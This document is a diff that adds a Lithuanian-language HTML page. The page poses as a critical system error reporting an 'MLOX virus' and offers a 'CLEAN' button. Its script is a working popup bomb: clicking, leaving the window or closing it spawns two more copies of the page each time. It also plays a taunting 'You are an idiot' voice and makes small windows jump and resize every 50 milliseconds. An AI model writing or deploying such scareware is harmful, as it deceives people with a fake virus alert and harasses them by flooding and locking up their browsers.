@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="lt">
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ SISTEMOS KLAIDA ⚠️</title>
+    <style>
+        body {
+            background-color: #ff0000;
+            color: white;
+            font-family: "Courier New", Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            animation: shake 0.1s infinite;
+        }
+
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            40% { transform: translate(3px, 2px) rotate(0deg); }
+            60% { transform: translate(-1px, -1px) rotate(1deg); }
+            80% { transform: translate(-3px, 1px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+
+        .warn {
+            font-size: 50px;
+            font-weight: bold;
+            text-shadow: 5px 5px black;
+            text-align: center;
+        }
+
+        button {
+            background-color: white;
+            color: red;
+            border: none;
+            padding: 20px 50px;
+            font-size: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body onbeforeunload="return spawn()" onblur="spawn()">
+
+    <div class="warn">KRITINĖ KLAIDA!<br>MLOX VIRUS APTIKTAS</div>
+    <button onclick="spawn()">IŠVALYTI / CLEAN</button>
+
+    <script>
+        function spawn() {
+            // Sugeneruojame 2 naujus langus
+            for (let i = 0; i < 2; i++) {
+                let w = Math.floor(Math.random() * 400) + 200;
+                let h = Math.floor(Math.random() * 400) + 200;
+                let x = Math.random() * window.screen.availWidth;
+                let y = Math.random() * window.screen.availHeight;
+                
+                window.open(window.location.href, '_blank', `width=${w},height=${h},left=${x},top=${y}`);
+            }
+            
+            // Paleidžiam įkyrų garsą
+            let audio = new SpeechSynthesisUtterance("You are an idiot! Ha ha ha ha ha!");
+            window.speechSynthesis.speak(audio);
+        }
+
+        // Tik mažiems (iškritusiems) langams: bėgiojimas ir dydžio keitimas
+        if (window.innerWidth < 700) {
+            setInterval(() => {
+                window.moveBy(Math.random() * 100 - 50, Math.random() * 100 - 50);
+                window.resizeTo(
+                    Math.floor(Math.random() * 300) + 200,
+                    Math.floor(Math.random() * 300) + 200
+                );
+            }, 50);
+        }
+    </script>
+</body>
+</html>
